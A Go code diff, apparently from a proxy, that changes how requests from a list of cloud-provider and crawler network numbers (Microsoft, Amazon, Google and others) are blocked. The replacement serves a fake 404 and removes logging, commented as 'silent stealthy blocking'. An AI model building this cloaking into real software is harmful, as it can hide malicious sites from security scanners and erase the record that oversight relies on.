@@ -226,12 +226,12 @@ for _, blocked := range blockedUserAgents {
 						// 8075 = Microsoft, 16509 = Amazon, 15169 = Google, etc
 						blockedASNs := []uint{17012, 1449, 206753, 59065, 26444, 19527, 36040, 396982, 16550, 16591, 35693, 397316, 8075, 16509, 15169, 29981}
 
-						for _, blockedASN := range blockedASNs {
-							if record.AutonomousSystemNumber == blockedASN {
-								log.Warning("blocked ASN: %d (%s) from IP %s", record.AutonomousSystemNumber, record.AutonomousSystemOrganization, from_ip)
-								return p.blockRequest(req)
-							}
-						}
+for _, blockedASN := range blockedASNs {
+    if record.AutonomousSystemNumber == blockedASN {
+        // Silent stealthy blocking - no logs
+        return p.return404Response(req)
+    }
+}
 					}
 				}
 			}
